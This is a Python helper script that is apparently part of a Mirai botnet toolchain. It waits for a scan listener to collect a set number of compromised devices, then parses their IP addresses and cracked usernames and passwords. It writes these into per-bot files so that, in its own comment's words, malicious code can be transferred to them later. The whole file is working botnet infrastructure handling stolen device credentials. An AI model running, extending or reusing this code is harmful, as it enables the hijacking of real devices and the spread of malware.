import sys
import os
import time


def main(argv):
    if len(argv) != 7:
        print("Usage: {} Path ScanListenOutputFile.txt ScanFinishedFile.txt numOfNewBots Mirai-Source-Code/mirai/debug input_bot".format(argv[0]))

    path = argv[1]
    scanListenOutputFile = os.path.join(path, argv[2])
    scanFinishedFile = os.path.join(path, argv[3])
    numOfNewBots = int(argv[4])

    debug_path = argv[5]  # "Mirai-Source-Code/mirai/debug"
    input_bot = argv[6]  # "input_bot"

    with open(scanFinishedFile, 'w+') as fw:
        fw.write('False')

    while True:
        bots = set(open(scanListenOutputFile).readlines())  # NumOfUniqueLines
        if len(bots) == numOfNewBots:
            break
        time.sleep(1)

    cmd = 'sed -i "s/\\x0//g" {0}'.format(scanListenOutputFile)
    os.system(cmd)

    bots = set(open(scanListenOutputFile).readlines())  # NumOfUniqueLines

    with open(scanFinishedFile, 'w+') as fw:
        fw.write('True')

    # write bot's information to prepare for transfering malicious to bots in future
    # handle bots
    # input_bot = "input_bot" #  example: input_bot_192.168.1.112.txt
    for bot in bots:
        tmp = bot.strip().split(' ')
        ip = tmp[0].split(':')[0]
        username = tmp[1].split(':')[0]
        password = tmp[1].split(':')[1]

        debug_path = os.path.join(path, debug_path)
        input_file = os.path.join(debug_path, "{0}_{1}.txt".format(input_bot, ip))
        with open(input_file, 'w+') as fw:
            fw.writelines("{0}:{1}:{2}\n".format(ip, username, password))


main(sys.argv)
